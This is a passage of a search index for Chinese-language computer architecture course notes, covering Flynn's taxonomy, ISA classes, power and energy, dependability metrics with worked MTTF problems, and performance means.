\u5f88\u91cd\u8981\uff1b\u6574\u4f53\u6027\u80fd(\u541e\u5410\u91cf)\u5f88\u91cd\u8981\u3002 Cluster/warehouse-scale computer \u6027\u4ef7\u6bd4\u3001\u541e\u5410\u91cf\u3001\u80fd\u8017\u5747\u8861\u6027 \u96c6\u7fa4\u6307\u4e00\u7ec4\u8ba1\u7b97\u673a\u901a\u8fc7\u5c40\u57df\u7f51\u8fde\u63a5\uff0c\u6bcf\u4e2a\u8282\u70b9\u90fd\u6709\u81ea\u5df1\u7684 OS\uff0c\u8282\u70b9\u4e4b\u95f4\u4f7f\u7528\u7f51\u7edc\u534f\u8bae\u901a\u4fe1\u3002\u975e\u5e38\u6602\u8d35\u3002 Internet ofthings/embedded \u4ef7\u683c\u3001\u80fd\u8017\u3001\u7279\u6b8a\u529f\u80fd\u7684\u6027\u80fd \u7269\u8054\u7f51(IoT)\u901a\u5e38\u6307\u4ee5\u65e0\u7ebf\u65b9\u5f0f\u8fde\u63a5\u4e92\u8054\u7f51\u7684\u5d4c\u5165\u5f0f\u8ba1\u7b97\u673a\uff0c\u8bbe\u5907\u4e4b\u95f4\u5904\u7406\u80fd\u529b\u548c\u4ef7\u683c\u76f8\u5dee\u6781\u5927\u3002"},{"location":"Courses/CA/Fundamentals%20of%20Computer%20Design/#class-of-parallelism","title":"Class of Parallelism","text":"<p>\u591a\u79cd\u7ea7\u522b\u7684\u5e76\u884c\u5df2\u6210\u4e3a\u8ba1\u7b97\u673a\u8bbe\u8ba1\u7684\u4e3b\u8981\u9a71\u52a8\u529b\uff0c\u80fd\u8017\u548c\u6210\u672c\u662f\u5176\u4e3b\u8981\u7ea6\u675f\u3002\u5e94\u7528\u5c42\u9762\u4e2d\uff0c\u6709\u4ee5\u4e0b\u4e24\u79cd\u57fa\u672c\u5e76\u884c\uff1a</p> <ul> <li>&lt;1&gt; Data-Level Parallelism(DLP): \u540c\u65f6\u64cd\u4f5c\u591a\u4e2a\u6570\u636e\u9879</li> <li>&lt;2&gt; Task-Level Parallelism(TLP): \u5e76\u884c\u5730\u5355\u72ec\u6267\u884c\u591a\u4e2a\u5de5\u4f5c\u4efb\u52a1</li> </ul> <p>\u5728\u8ba1\u7b97\u673a\u786c\u4ef6\u4e2d\uff0c\u4ee5\u5982\u4e0b\u56db\u79cd\u4e3b\u8981\u65b9\u5f0f\u6765\u5229\u7528\u3001\u5b9e\u73b0\u8fd9\u4e24\u79cd\u7c7b\u578b\u7684\u5e94\u7528\u5e76\u884c\uff1a</p> <ul> <li>&lt;1&gt; Instruction-Level Parallelism(ILP): \u5728\u6d41\u6c34\u7ebf\u3001\u63a8\u6d4b\u6267\u884c(Speculative Execution)\u4e24\u4e2a\u5c42\u9762\u4e0a\u5bf9 DLP \u8fdb\u884c\u5229\u7528<ul> <li>Chapter 3</li> </ul> </li> <li>&lt;2&gt; Vector architectures, graphic processor unit(GPUs), and multimedia instruction sets: \u5c06\u5355\u6761\u6307\u4ee4\u5e76\u884c\u5e94\u7528\u4e8e\u4e00\u7ec4\u6570\u636e\uff0c\u4ee5\u5229\u7528\u6570\u636e\u7ea7\u5e76\u884c DLP<ul> <li>Chapter 4</li> </ul> </li> <li>&lt;3&gt; Thread-Level Parallelism: \u5728 Tightly Coupled Hardware \u4e2d\u5229\u7528 DLP \u6216 TLP \u3002\u8fd9\u79cd\u6a21\u578b\u5141\u8bb8\u5e76\u884c\u7ebf\u7a0b\u4e4b\u95f4\u8fdb\u884c\u4ea4\u4e92 <ul> <li>Chapter 5</li> </ul> </li> <li>&lt;4&gt; Request-Level Parallelism(RLP): \u5229\u7528\u7a0b\u5e8f\u5458\u6216\u64cd\u4f5c\u7cfb\u7edf\u6307\u5b9a\u7684\u5927\u91cf\u89e3\u8026\u4efb\u52a1\u4e4b\u95f4\u7684\u5e76\u884c\u6027<ul> <li>Chapter 6</li> </ul> </li> </ul> <p>Flynn \u5728\u7814\u7a76\u5e76\u884c\u8ba1\u7b97\u5de5\u4f5c\u91cf\u65f6\uff0c\u63d0\u51fa\u4e86\u4e00\u79cd\u7b80\u5355\u7684\u5206\u7c7b\u65b9\u5f0f\uff1a</p> <p>Single/Multiple Instruction/Data stream</p> <ul> <li>SISD: \u5355\u5904\u7406\u5668\uff0c\u4f46\u662f\u53ef\u4ee5\u5229\u7528\u6307\u4ee4\u7ea7\u5e76\u884c ILP<ul> <li>Chapter 3</li> </ul> </li> <li>SIMD: \u540c\u4e00\u6761\u6307\u4ee4\u7531\u591a\u4e2a\u4f7f\u7528\u4e0d\u540c\u6570\u636e\u6d41\u7684\u5904\u7406\u5668\u6267\u884c\uff0c\u5229\u7528\u6570\u636e\u7ea7\u5e76\u884c DLP<ul> <li>Chapter 4</li> </ul> </li> <li>MISD: \u6ca1\u6709\u8fd9\u79cd\u67b6\u6784\u7684\u5546\u7528\u5904\u7406\u5668<ul> <li>\u4e0d\u5b58\u5728</li> </ul> </li> <li>MIMD: \u6bcf\u4e2a\u5904\u7406\u5668\u90fd\u63d0\u53d6\u81ea\u5df1\u7684\u6307\u4ee4\uff0c\u5bf9\u81ea\u5df1\u7684\u6570\u636e\u8fdb\u884c\u64cd\u4f5c\uff0c\u9488\u5bf9\u4efb\u52a1\u7ea7\u5e76\u884c TLP<ul> <li>Chapter 5, 6</li> </ul> </li> </ul> <p>\u8fd9\u4e2a\u5206\u7c7b\u5f88\u7c97\u7565\uff0c\u5f88\u591a\u5e76\u884c\u5904\u7406\u5668\u5176\u5b9e\u662f SISD\u3001SIMD\u3001MIMD \u7684\u6df7\u5408\u7c7b\u578b</p>"},{"location":"Courses/CA/Fundamentals%20of%20Computer%20Design/#ca-definition","title":"CA Definition","text":"<p>CA must design the organization and hardware to meet functional requirements as well as price, power, performance, and availability goals.</p> <p>Definition: Instruction Design &amp; Implementation \u6307\u4ee4\u96c6\u53ca\u5176\u5b9e\u73b0</p> <p>ISA \u76f8\u5f53\u4e8e\u8f6f\u786c\u4ef6\u4e4b\u95f4\u7684\u754c\u9650\uff0c\u4e0b\u9762\u5c06\u4ece\u4e03\u4e2a\u65b9\u9762\u6765\u7b80\u8981\u4ecb\u7ecd\u4ee5\u4e0b ISA\uff1a</p> <ul> <li>&lt;1&gt; Class of ISA: \u51e0\u4e4e\u6240\u6709 ISA \u90fd\u662f\u901a\u7528\u5bc4\u5b58\u5668\u4f53\u7cfb\u7ed3\u6784\uff0c\u5373 Register Machine\uff0c\u64cd\u4f5c\u6570\u8981\u4e48\u662f\u5bc4\u5b58\u5668\uff0c\u8981\u4e48\u662f\u5b58\u50a8\u5730\u5740\u3002\u8fd9\u4e00\u7c7b\u522b\u53c8\u53ef\u5206\u4e3a\u4e24\u79cd\u4e3b\u6d41\u7248\u672c<ul> <li>Register-Memory ISA: 80x86, \u8bb8\u591a\u6307\u4ee4\u53ef\u4ee5\u76f4\u63a5\u8bbf\u95ee\u5185\u5b58</li> <li>Load-Store ISA: RISC-V, ARMv8, \u53ea\u6709 load, store \u80fd\u591f\u8bbf\u95ee\u5185\u5b58<ul> <li>\u81ea 1985 \u5e74\u540e\u53d1\u5e03\u7684 ISA \u90fd\u662f Load-Store ISA</li> </ul> </li> </ul> </li> <li>&lt;2&gt; Memory Addressing: \u51e0\u4e4e\u6240\u6709\u8ba1\u7b97\u673a\u90fd\u91c7\u7528\u5b57\u8282\u5bfb\u5740\u6765\u8bbf\u95ee\u5b58\u50a8\u5668\u3002<ul> <li>\u6709\u4e9b\u4f53\u7cfb\u7ed3\u6784(\u5982 ARMv8)\u8981\u6c42\u64cd\u4f5c\u5bf9\u8c61\u5bf9\u9f50\u300280x86 \u548c RISC-V \u4e0d\u8981\u6c42\u5bf9\u9f50\uff0c\u4f46\u662f\u5982\u679c\u64cd\u4f5c\u6570\u662f\u5bf9\u9f50\u7684\uff0c\u8bbf\u95ee\u901f\u5ea6\u901a\u5e38\u4f1a\u5feb\u4e00\u4e9b</li> </ul> </li> <li>&lt;3&gt; Addressing Modes: \u5bc4\u5b58\u5668\u5bfb\u5740\u3001\u7acb\u5373\u6570\u5bfb\u5740\u3001\u4f4d\u79fb\u91cf\u5bfb\u5740\u7b49</li> <li>&lt;4&gt; Types and sizes of operands: 8\u4f4d(ASCII\u5b57\u7b26)\u300116\u4f4d(Unicode\u5b57\u7b26\u6216 half word)\u300132\u4f4d(integer \u6216 word)\u300164\u4f4d(double-word \u6216 long integer)\u3001IEEE \u6d6e\u70b9\u6570(32bit for single, 64bit for double, 80bit for extended double)</li> <li>&lt;5&gt; Operations: \u5e38\u89c1\u7684\u64cd\u4f5c\u6709\u6570\u636e\u4f20\u8f93\u6307\u4ee4\u3001\u7b97\u672f\u903b\u8f91\u6307\u4ee4\u3001\u63a7\u5236\u6307\u4ee4\u548c\u6d6e\u70b9\u6307\u4ee4</li> <li>&lt;6&gt; Control FLow Instructions: \u6761\u4ef6\u5206\u652f\u3001\u65e0\u6761\u4ef6\u8df3\u8f6c\u3001\u8fc7\u7a0b\u8c03\u7528\u53ca\u8fd4\u56de</li> <li>&lt;7&gt; Encoding: \u6709\u56fa\u5b9a\u957f\u5ea6\u548c\u53ef\u53d8\u957f\u5ea6\u4e24\u79cd\u57fa\u672c\u7684\u7f16\u7801\u9009\u62e9\u3002<ul> <li>ARMv8 \u548c RISC-V \u90fd\u662f\u56fa\u5b9a 32-bit \u957f\u5ea6\u6307\u4ee4</li> <li>80x86 \u7684\u7f16\u7801\u662f\u53ef\u53d8\u957f\u5ea6\uff0c\u53d8\u5316\u8303\u56f4\u662f 1-18 Bytes</li> </ul> </li> </ul> Class of ISA (\u636e\u8bf4\u51fa\u8fc7\u4e00\u9053\u9898) <ul> <li>&lt;1&gt; Register Machine \u62e5\u6709\u663e\u5f0f\u7684\u64cd\u4f5c\u6570<ul> <li>Register-Memory ISA\uff0c\u5982 x86</li> <li>Load-Store ISA(Register-Register ISA)\uff0c\u5982 RISC-V</li> </ul> </li> <li>&lt;2&gt; Stack Machine \u9690\u5f0f\u64cd\u4f5c\u6570\uff0c\u64cd\u4f5c\u6570\u4f4d\u4e8e\u6808\u9876<ul> <li>\u64cd\u4f5c\u6570\u4ece\u6808\u9876\u5f39\u51fa\uff0c\u8ba1\u7b97\u7ed3\u679c\u538b\u56de\u6808\u9876</li> </ul> </li> <li>&lt;3&gt; Accumulator Machine<ul> <li>\u6709\u4e00\u4e2a\u4e34\u65f6\u7684\u7d2f\u52a0\u5668\uff0c\u64cd\u4f5c\u6570\u653e\u5728\u7d2f\u52a0\u5668\u5185\u8ba1\u7b97</li> </ul> </li> </ul> <p></p> <p>ISA \u56db\u4e2a\u8bbe\u8ba1\u539f\u5219</p> <ul> <li>Simplicity favors regularity</li> <li>Smaller is faster</li> <li>Make common case fast</li> <li>Good design demands good compromises</li> </ul>"},{"location":"Courses/CA/Fundamentals%20of%20Computer%20Design/#trends","title":"Trends","text":"<p>Performance-Driven: Quantatives \ud83e\udd14</p>"},{"location":"Courses/CA/Fundamentals%20of%20Computer%20Design/#technology","title":"Technology","text":"<p>\u8981\u4e3a\u8ba1\u7b97\u673a\u7684\u53d1\u5c55\u505a\u957f\u8fdc\u8ba1\u5212\uff0c\u8bbe\u8ba1\u4eba\u5458\u5fc5\u987b\u4e86\u89e3 Implementation \u6280\u672f\u7684\u5feb\u901f\u53d8\u5316\uff0c\u4ee5\u4e0b\u4e94\u79cd\u5b9e\u73b0\u6280\u672f\u662f\u73b0\u4ee3\u8ba1\u7b97\u673a\u4e0d\u53ef\u6216\u7f3a\u7684\uff1a</p> <ul> <li>\u82af\u7247\u5de5\u827a Integrated Circuit Logic Technology<ul> <li>\u6469\u5c14\u5b9a\u5f8b\u9010\u6e10\u5931\u6548</li> </ul> </li> <li>Memory \u5de5\u827a Semiconductor DRAM<ul> <li>Dynamic Random-Access Memory</li> <li>\u5bb9\u91cf\u3001\u5ef6\u8fdf\u3001\u5e26\u5bbd</li> </ul> </li> <li>SSD \u5de5\u827a Semiconductor Flash<ul> <li>Electrically Erasable Programmable Read-Only Memory</li> <li>\u975e\u6613\u5931\u6027\u534a\u5bfc\u4f53\u5b58\u50a8</li> </ul> </li> <li>\u78c1\u76d8\u5de5\u827a Magnetic Disk Technology<ul> <li>\u662f\u670d\u52a1\u5668\u5b58\u50a8\u548c\u4ed3\u5e93\u7ea7\u5b58\u50a8\u7684\u6838\u5fc3\u6280\u672f</li> </ul> </li> <li>\u7f51\u7edc\u5de5\u827a Network Technology<ul> <li>\u5ef6\u8fdf\u3001\u5e26\u5bbd</li> <li>\u7f51\u7edc\u6027\u80fd\u53d6\u51b3\u4e8e\u4ea4\u6362\u673a\u548c\u4f20\u8f93\u7cfb\u7edf\u7684\u6027\u80fd</li> </ul> </li> </ul> <p>\u8fd9\u4e9b\u5feb\u901f\u53d1\u5c55\u7684\u6280\u672f\u5de6\u53f3\u7740\u8ba1\u7b97\u673a\u8bbe\u8ba1\u7684\u547d\u8fd0\u3002\u7531\u4e8e\u8ba1\u7b97\u901f\u5ea6\u7684\u6fc0\u589e\u548c\u6280\u672f\u7684\u8fc5\u731b\u53d1\u5c55\uff0c\u4e00\u79cd\u8ba1\u7b97\u673a\u8bbe\u8ba1\u7684\u751f\u5b58\u671f\u53ef\u80fd\u53ea\u6709 3-5 \u5e74\u3002</p> <p>Bandwidth \u6216 Throughput \u6307\u7ed9\u5b9a\u65f6\u95f4\u5b8c\u6210\u7684\u603b\u5de5\u4f5c\u91cf\uff0c\u6bd4\u5982\u78c1\u76d8\u8bfb\u5199\u7684\u6bcf\u79d2\u4f20\u8f93\u5146\u5b57\u8282\u6570\u3002 \u76f8\u5bf9\u7684\uff0cLatency \u6216 Response Time \u6307\u4e00\u4e2a\u4e8b\u4ef6\u4ece\u5f00\u59cb\u5230\u5b8c\u6210\u6240\u7ecf\u8fc7\u7684\u65f6\u95f4\uff0c\u6bd4\u5982\u4e00\u6b21\u78c1\u76d8\u8bbf\u95ee\u9700\u8981\u7684\u6beb\u79d2\u6570\u3002</p> <p>\u5e26\u5bbd\u4e0e\u5ef6\u8fdf\u7684\u6539\u8fdb\u91cc\u7a0b\u7891\u7684\u53cc\u5bf9\u6570\u66f2\u7ebf\uff08\u76f4\u7ebf\u662f 1\uff1a1\uff09</p> <p></p> <p>\u5728\u6280\u672f\u7684\u53d1\u5c55\u8fc7\u7a0b\u4e2d\uff0cBandwidth \u7684\u53d1\u5c55\u901f\u5ea6\u8d85\u8fc7\u4e86 Latency\uff0c\u5e76\u4e14\u8fd9\u4e00\u8d8b\u52bf\u5f88\u53ef\u80fd\u4f1a\u7ee7\u7eed\u6301\u7eed\u4e0b\u53bb\u3002</p>"},{"location":"Courses/CA/Fundamentals%20of%20Computer%20Design/#power-and-energy","title":"Power and Energy","text":"<p>\u5bf9\u4e8e CMOS \u82af\u7247\u6765\u8bf4\uff0c\u4f20\u7edf\u7684\u4e3b\u8981\u80fd\u8017\u662f\u5f00\u5173\u6676\u4f53\u7ba1\uff0c\u5373\u52a8\u6001\u80fd\u8017(Dynamic Energy)\u3002\u6bcf\u4e2a\u6676\u4f53\u7ba1\u7684\u80fd\u8017\u8ddf\u8be5\u6676\u4f53\u7ba1\u9a71\u52a8\u7684\u5bb9\u6027\u8d1f\u8f7d\u4e0e\u7535\u538b\u5e73\u65b9\u7684\u4e58\u79ef\u5e73\u65b9\u6210\u6b63\u6bd4\uff1a</p> \\[ Energy_{Dynamic} \\propto Capacity\\ Load \\times Voltage^2  \\] <p>\u4e0a\u5f0f\u8868\u793a\u903b\u8f91\u8f6c\u6362\u8109\u51b2 0=&gt;1=&gt;0 \u6216 1=&gt;0=&gt;1 \u6240\u9700\u7684\u80fd\u8017\uff0c\u5355\u6b21\u8f6c\u6362\u4e58\u4e0a \\(\\frac{1}{2}\\) \u5373\u53ef</p> <p>\u6bcf\u4e2a\u6676\u4f53\u7ba1\u6240\u9700\u7684\u529f\u7387\u5c31\u662f\u4e00\u6b21\u8f6c\u6362\u7684\u80fd\u8017\u4e58\u4e0a\u8f6c\u6362\u9891\u7387\uff1a</p> \\[ Power_{Dynamic} \\propto \\frac{1}{2}\\times Capacity\\ Load \\times Voltage^2 \\times Frequency\\ Switched \\] <p>\u5bf9\u4e8e\u4e00\u9879 Fixed Task \uff0c\u964d\u4f4e\u65f6\u949f\u9891\u7387\u53ef\u4ee5\u964d\u4f4e \\(Power\\)\uff0c\u4f46\u4e0d\u4e00\u5b9a\u80fd\u964d\u4f4e \\(Energy\\)\u3002(\u8bfe\u672c\u539f\u8bdd)</p> <p>\u4e2a\u4eba\u8ba4\u4e3a\uff0c\u53ea\u6709\u964d\u538b\u624d\u80fd\u51cf\u5c11\u4e00\u4e2a\u56fa\u5b9a\u5de5\u4f5c\u91cf\u7684\u80fd\u8017\uff1b\u4f46\u662f\u5b9e\u9645\u4e0a\u964d\u9891\u548c\u964d\u538b\u5f80\u5f80\u662f\u76f8\u4f34\u51fa\u73b0\u7684</p> \\[Energy =Power \\times Execution\\ Time \\propto Capacity\\ Load \\times Voltage^2 \\] <p>\u914d\u7535\u3001\u6563\u70ed\u548c\u9632\u70ed\u70b9\u7684\u96be\u5ea6\u65e5\u76ca\u589e\u52a0\uff0c\u80fd\u8017\u662f\u73b0\u5728\u6676\u4f53\u7ba1\u7684\u4e3b\u8981\u9650\u5236\u56e0\u7d20\u3002\u56e0\u6b64\uff0c\u73b0\u4ee3\u5fae\u5904\u7406\u5668\u63d0\u4f9b\u4e86\u8bb8\u591a\u6280\u672f\uff0c\u8bd5\u56fe\u63d0\u9ad8\u80fd\u6548\uff08Energy-Effiency\uff09\uff1a</p> <ul> <li>&lt;1&gt; Do nothing well: \u5173\u95ed inactive modules \u7684\u65f6\u949f\uff0c\u4f8b\u5982\u5f53\u524d\u6ca1\u6709\u6267\u884c\u6d6e\u70b9\u6307\u4ee4\uff0c\u5219\u6d6e\u70b9\u5355\u5143\u7684\u65f6\u949f\u5c06\u88ab\u7981\u7528</li> <li>&lt;2&gt; Dynamic Voltage-Frequency Scaling, DVFS: \u5728\u4e00\u4e9b\u6d3b\u8dc3\u7a0b\u5ea6\u8f83\u4f4e\u7684\u65f6\u6bb5\uff0c\u4e0d\u4ee5\u6700\u9ad8\u9891\u7387\u548c\u7535\u538b\u8fd0\u8f6c</li> <li>&lt;3&gt; Design for the typical case: PMD \u548c\u7b14\u8bb0\u672c\u7b49\u8bbe\u5907\u7ecf\u5e38\u7a7a\u95f2\uff0c\u6240\u4ee5\u5185\u5916\u5b58\u50a8\u5668\u90fd\u63d0\u4f9b\u4e86\u4f4e\u529f\u8017\u6a21\u5f0f\uff0c\u4ee5\u51cf\u5c11\u80fd\u8017\uff0c\u5ef6\u957f\u7535\u6c60\u5bff\u547d</li> <li>&lt;4&gt; Overlocking: \u5373\u8d85\u9891\uff0c\u5927\u90e8\u5206\u9ad8\u6027\u80fd\u5fae\u5904\u7406\u5668\u90fd\u63d0\u4f9b\u4e86\u77ed\u65f6\u8d85\u9891\u7684\u529f\u80fd</li> </ul> <p>\u9664\u4e86\u4e0a\u8ff0\u6240\u8bf4\u7684\u5360\u4e3b\u8981\u90e8\u5206\u7684\u52a8\u6001\u529f\u8017\uff0c\u5373\u4fbf\u6676\u4f53\u7ba1\u5904\u4e8e\u5173\u95ed\u72b6\u6001\u4e5f\u5b58\u5728\u7684\u529f\u8017\u79f0\u4e3a\u9759\u6001\u529f\u8017\uff1a</p> \\[ Power_{static} \\propto Current_{static} \\times Voltage \\] <p>\u9759\u6001\u529f\u8017\u548c\u5143\u5668\u4ef6\u6570\u76ee\u6210\u6b63\u6bd4</p>"},{"location":"Courses/CA/Fundamentals%20of%20Computer%20Design/#cost","title":"Cost","text":"<p>\u5c3d\u7ba1\u6210\u672c\u5728\u4e00\u4e9b\u8ba1\u7b97\u673a\u8bbe\u8ba1\uff08\u7279\u522b\u662f\u8d85\u7ea7\u8ba1\u7b97\u673a\uff09\u4e2d\u4e0d\u662f\u7279\u522b\u91cd\u8981\uff0c\u4f46\u5bf9\u6210\u672c\u654f\u611f\u7684\u8bbe\u8ba1\u5374\u8d8a\u6765\u8d8a\u91cd\u8981\u3002</p> <p>Cost Trend \u7684\u5f71\u54cd\u56e0\u7d20\u4e3b\u8981\u6709\u4e09\u70b9\uff1aTime\uff08\u65f6\u95f4\uff09\u3001Volumn\uff08\u4ea7\u91cf\uff09\u3001Commoditization\uff08\u5927\u4f17\u5316\uff0c\u5546\u54c1\u5316\uff09</p> <p>Cost \u90e8\u5206\u504f\u5546\u4e1a\uff0c\u4e0d\u8bb2</p>"},{"location":"Courses/CA/Fundamentals%20of%20Computer%20Design/#dependability","title":"Dependability","text":"<p>\u7cfb\u7edf\u5728 SLA(Service Level Agreement) \u89c4\u5b9a\u7684\u4e24\u79cd\u670d\u52a1\u72b6\u6001\u4e2d\u8f6c\u6362\uff1a</p> <ul> <li>&lt;1&gt; Service Accomplishment\uff0c\u5373\u63d0\u4f9b\u4e86\u6307\u5b9a\u670d\u52a1</li> <li>&lt;2&gt; Service Interruption\uff0c\u5373\u6240\u63d0\u4f9b\u7684\u670d\u52a1\u4e0e SLA \u4e0d\u7b26</li> </ul> <p>\u670d\u52a1\u7b49\u7ea7\u534f\u8bae SLA \u662f\u57fa\u7840\u8bbe\u65bd\u4f9b\u5e94\u5546\u4e3a\u5ba2\u6237\u63d0\u4f9b\u7684\u4fdd\u8bc1\uff0c\u5f53\u4e0d\u6ee1\u8db3 SLA \u65f6\u53ef\u80fd\u9700\u8981\u5411\u5ba2\u6237\u4f5c\u8865\u507f</p> <p>\u4e24\u79cd SLA \u72b6\u6001\u901a\u8fc7 failures(\\(1\\Rightarrow 2\\)) \u6216\u8005 restorations(\\(2\\Rightarrow 1\\)) \u8fdb\u884c\u8f6c\u6362\u3002\u5bf9\u8fd9\u4e24\u79cd\u8f6c\u6362\u8fdb\u884c\u91cf\u5316\uff0c\u5f97\u5230 dependability \u7684\u4e24\u79cd\u5ea6\u91cf\uff1a</p> <ul> <li>MTTF mean time to failure \u5e73\u5747\u65e0\u6545\u969c\u65f6\u95f4<ul> <li>\u6545\u969c\u7387\u5373\u4e3a \\(\\frac{1}{MTTF}\\)\uff0c\u4ee5 10 \u4ebf\u5c0f\u65f6\u4e3a\u5355\u4f4d</li> </ul> </li> <li>MTTR mean time to repair \u5e73\u5747\u4fee\u590d\u65f6\u95f4</li> <li>MTBF mean time between failures<ul> <li>= MTTF + MTTR</li> </ul> </li> <li>Module Reliability \u53ef\u9760\u6027<ul> <li>\u4ece\u53c2\u7167\u70b9\u81f3\u51fa\u73b0\u6545\u969c\u7ecf\u8fc7\u65f6\u95f4\u7684\u91cf\u5ea6\uff0c\u5373\u901a\u5e38\u901a\u8fc7 MTTF \u4f5c\u4e3a\u91cf\u5ea6</li> <li>\u5728\u8ba1\u7b97\u673a\u7ec4\u6210\u4e2d\u8be5\u5904\u4e3a Dependability\uff0c\u5747\u7ffb\u8bd1\u4e3a\u53ef\u9760\u6027</li> </ul> </li> <li>Module Availability \u53ef\u7528\u6027<ul> <li>\\(= \\frac{MTTF}{MTTF+MTTR}= \\frac{MTTF}{MTBF}\\)</li> </ul> </li> </ul> <p>\u901a\u8fc7\u5197\u4f59\u63d0\u9ad8 Dependability\uff0cRAID\u3002\u89c1\u8ba1\u7ec4\u90e8\u5206\u3002</p> <p>MTTF \u4f8b\u9898</p> \u9898\u9762\u7b54\u6848 <p>A system consists of the following components, calculate the MTTF of the system:</p> <ul> <li>10 disks, 1000000 hour MTTF</li> <li>1 SCSI Controller, 500000 hour MTTF</li> <li>1 power supply, 1 fan, both 200000 hour MTTF</li> <li>1 SCSI cable, 1000000 hour MTTF</li> </ul> <p>\u53ef\u4ee5\u7b80\u5355\u8ba4\u4e3a\u4e00\u4e2a\u7cfb\u7edf\u7684\u6545\u969c\u7387\u662f\u6240\u6709\u7ec4\u4ef6\u7684\u6545\u969c\u7387\u4e4b\u548c\uff0c\u6545\u969c\u7387\u5373\u4e3a MTTF \u7684\u5012\u6570\uff0c\u90a3\u4e48\uff1a</p> \\[\\frac{1}{MTTF}= 10\\times \\frac{1}{1000000} + \\frac{1}{500000} + 2\\times \\frac{1}{200000} + \\frac{1}{1000000}\\] <p>\u8ba1\u7b97\u5f97\u5230 \\(MTTF=43500 hour\\)</p> <p>\u5386\u5e74\u66fe\u8003\u8fc7\u7684\u539f\u9898</p> \u9898\u9762\u7b54\u6848 <p>If a company has 10,000 computers, each with a MTTF of 30 days, and it experences catastrophic failure only if 1/3 of the computers fail. What is the MTTF of the system?</p> <ul> <li>\u7535\u8111\u6bcf\u5929\u6545\u969c\u7684\u6982\u7387 \\(\\frac{1}{30}\\)</li> <li>\u6bcf\u5929\u6545\u969c\u7684\u7535\u8111\u6570\u91cf \\(10000\\times \\frac{1}{30}\\)</li> <li>\u5f53\u6709 \\(10000 \\times \\frac{1}{3}\\) \u7535\u8111\u53d1\u751f\u6545\u969c\u65f6\uff0c\u7cfb\u7edf\u53d1\u751f\u6545\u969c</li> <li>\u5d29\u6e83\u5929\u6570\u4e3a \\(\\frac{10000\\times \\frac{1}{3} }{10000\\times \\frac{1}{30}} = 10\\) \u5929</li> </ul>"},{"location":"Courses/CA/Fundamentals%20of%20Computer%20Design/#performance","title":"Performance","text":"<p>\u5bf9\u8ba1\u7b97\u673a\u6027\u80fd\u7684\u76f4\u89c2\u4f30\u8ba1\u5c31\u662f\u6267\u884c\u65f6\u95f4\u7684\u5012\u6570\uff1a</p> \\[ Peformance = \\frac{1}{Execution\\ time} \\] <p>\u6839\u636e\u6d4b\u91cf\u65b9\u5f0f\uff0cExecution Time \u4e5f\u4f1a\u6709\u4e0d\u540c\u7684\u5b9a\u4e49\u65b9\u5f0f\uff1a</p> <ul> <li>wall-clock time/response time/elapsed time \u5b8c\u6210\u4e00\u9879\u4efb\u52a1\u7684 latency\uff0c\u5305\u62ec storage accesses\u3001memory accesses\u3001I/O activities\u3001OS overheading \u7b49\u6240\u6709\u76f8\u5173\u65f6\u95f4</li> <li>CPU Time \u53ea\u6307 CPU \u6267\u884c\u8ba1\u7b97\u7684\u65f6\u95f4<ul> <li>\u8fd8\u53ef\u4ee5\u8fdb\u4e00\u6b65\u5212\u5206\u4e3a user CPU time \u548c system CPU time</li> </ul> </li> </ul> <p>\u6b64\u5916\uff0c\u7528\u6237\u8ba1\u7b97\u4ed6\u4eec\u7684\u8ba1\u7b97\u673a\u76f8\u5bf9\u6027\u80fd\u7684\u65b9\u5f0f\u4f7f\u7528 Benchmark Program</p> <p>24 \u79cb\u51ac\u671f\u672b</p> <p>Which one of the following performances generates consistent result, no matter which machine is the reference?</p> <ul> <li>A. arithmetic mean<ul> <li>\\(AM= \\frac{1}{n} \\sum_{i=1}^n Time_i\\)</li> </ul> </li> <li>B. weighted arithmetic mean<ul> <li>\\(WAM=\\sum_{i=1}^n Weight_i \\times Time_i\\)</li> <li>\u4e5f\u53ef\u4ee5\u7f29\u5199\u4e3a WEM (Weighted Execution Time)</li> </ul> </li> <li>C. normalized geometric mean<ul> <li>\u51e0\u4f55\u5e73\u5747\u503c \\(GM\\) \u5177\u6709\u7edf\u4e00\u7684\u7ed3\u679c\uff0c\u65e0\u8bba\u53c2\u8003\u673a\u5668\u662f\u4ec0\u4e48</li> <li>\\(GM=\\sqrt[n]{\\Pi_{i=1}^n Relative\\_Rate_i}\\)</li> <li>\\(\\frac{GM(X)}{GM(Y)}=GM(\\frac{X}{Y})\\)</li> </ul> </li> <li>D. harmonic mean<ul> <li>\u672c\u8d28\u548c arithmetic mean \u76f8\u540c</li> <li>\\(HM=\\frac{n}{\\sum_{i=1}^n \\frac{1}{Rate_i}}\\)</li> </ul> </li> </ul>"},{"location":"Courses/CA/Fundamentals%20of%20Computer%20Design/#quantitative-principles","title":"Quantitative Principles","text":"<p>\u4ee5\u4e0b\u51e0\u70b9\u4e3a\u8ba1\u7b97\u673a\u8bbe\u8ba1\u4e0e\u5206\u6790\u4e2d\u975e\u5e38\u6709\u7528\u7684\u6307\u5bfc\u539f\u5219\uff1a</p> <ul> <li>Take advantage of Parallelism</li> <li>Principle of Locality</li> <li>Focus on Common Case</li> <li>Amdahl's Law</li> </ul>"},{"location":"Courses/CA/ILP/","title":"Instruction-Level Parallelism","text":""},{"location":"Courses/CA/ILP/#instruction-level-parallelism","title":"Instruction-Level Parallelism","text":"<p> \u7ea6 6945 \u4e2a\u5b57  42 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 35 \u5206\u949f</p>"},{"location":"Courses/CA/ILP/#overview","title":"Overview","text":"<p>1985 \u5e74\u4ee5\u540e\u7684\u5904\u7406\u5668\u51e0\u4e4e\u90fd\u4f7f\u7528\u4e86\u6d41\u6c34\u7ebf\u6765\u4f7f\u6307\u4ee4\u80fd\u91cd\u53e0\u6267\u884c\u3002\u6307\u4ee4\u4e4b\u95f4\u7684\u53ef\u80fd\u7684\u91cd\u53e0\u79f0\u4e3a\u6307\u4ee4\u7ea7\u5e76\u884c Instruction-Level Parallelism\u3002</p> <p>\u6709\u5173\u63d0\u4f9b\u6307\u4ee4\u95f4\u5e76\u884c\u5ea6\u6765\u6269\u5c55\u57fa\u672c\u6d41\u6c34\u7ebf\u6982\u5ff5\u7684\u6280\u672f\u5305\u62ec\u5982\u4e0b\uff0c\u4ee5\u53ca\u5b83\u4eec\u5206\u522b\u964d\u4f4e\u4e86 CPI \u7684\u54ea\u4e00\u90e8\u5206\uff1a</p> <p></p> <p>\u4e00\u4e2a\u6d41\u6c34\u7ebf\u5904\u7406\u5668\u7684 CPI \u503c\u7b49\u4e8e\u57fa\u7840 CPI \u548c\u56e0\u4e3a\u5404\u79cd Stall 